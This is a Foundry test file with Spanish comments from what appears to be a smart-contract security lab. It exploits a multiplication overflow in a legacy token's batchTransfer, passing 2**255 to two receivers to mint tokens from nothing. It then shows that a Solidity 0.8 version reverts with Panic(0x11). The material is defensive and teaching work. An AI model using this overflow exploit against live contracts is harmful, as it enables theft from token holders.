// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {LegacyTokenFixed} from "../../src/unsafe-arithmetic/mitigations/LegacyTokenFixed.sol";

/// @dev Interfaz compilada bajo el perfil por defecto (0.8.24) -- ninguna
///      interfaz tiene lógica que pueda entrar en conflicto de pragma con
///      el contrato real, compilado aparte bajo el perfil "legacy" (0.7.6).
interface ILegacyToken {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function batchTransfer(address[] memory receivers, uint256 value) external returns (bool);
}

contract UnsafeArithmetic01Test is Test {
    ILegacyToken token;
    LegacyTokenFixed tokenFixed;

    address attacker = makeAddr("attacker");
    address attackerB = makeAddr("attackerB");
    address attackerC = makeAddr("attackerC");

    function setUp() public {
        // LegacyToken.sol requiere: forge build --profile legacy (una vez,
        // o tras cualquier `forge clean`) antes de correr este test -- el
        // perfil por defecto (0.8.24) nunca compila este fichero, vive fuera
        // de src/ precisamente para evitar el conflicto de pragma.
        bytes memory creationCode = abi.encodePacked(vm.getCode("LegacyToken.sol"), abi.encode(uint256(1)));
        address deployed;
        vm.prank(attacker);
        assembly {
            deployed := create(0, add(creationCode, 0x20), mload(creationCode))
        }
        require(deployed != address(0), "LegacyToken deployment failed -- corre forge build --profile legacy primero");
        token = ILegacyToken(deployed);

        tokenFixed = new LegacyTokenFixed(1);
        vm.prank(address(this));
        // el deployer de tokenFixed es este contrato de test; transferimos
        // el suministro a `attacker` para reproducir el mismo punto de partida
        tokenFixed.transfer(attacker, 1);
    }

    /// @dev attacker parte de 1 token. batchTransfer([attackerB, attackerC],
    ///      2**255): cnt=2, amount = 2 * 2**255 = 2**256, que en 256 bits
    ///      desborda EXACTAMENTE a 0. require(balance >= 0) pasa trivialmente,
    ///      balanceOf[attacker] no cambia, pero el bucle SÍ acredita 2**255 a
    ///      cada receptor con el `value` original, sin desbordar -- tokens
    ///      creados de la nada, muy por encima del totalSupply declarado (1).
    function test_exploit_batchTransferOverflow() public {
        assertEq(token.balanceOf(attacker), 1);

        address[] memory receivers = new address[](2);
        receivers[0] = attackerB;
        receivers[1] = attackerC;

        vm.prank(attacker);
        token.batchTransfer(receivers, 2 ** 255);

        assertEq(token.balanceOf(attacker), 1, "el 'gasto' desbordo a 0 -- sin cambio real");
        assertEq(token.balanceOf(attackerB), 2 ** 255, "tokens creados de la nada");
        assertEq(token.balanceOf(attackerC), 2 ** 255, "dos veces");
        assertGt(token.balanceOf(attackerB), token.totalSupply(), "muy por encima del supply declarado");
    }

    /// @dev Mismo intento contra LegacyTokenFixed (idéntica lógica, pragma
    ///      ^0.8.19): `cnt * value` desborda igual matemáticamente, pero el
    ///      compilador inyecta una comprobación automática -- revierte con
    ///      un Panic(0x11), sin que haya que escribir ni un require de más.
    function test_mitigation_blocksBatchTransferOverflow() public {
        assertEq(tokenFixed.balanceOf(attacker), 1);

        address[] memory receivers = new address[](2);
        receivers[0] = attackerB;
        receivers[1] = attackerC;

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11));
        tokenFixed.batchTransfer(receivers, 2 ** 255);
    }
}
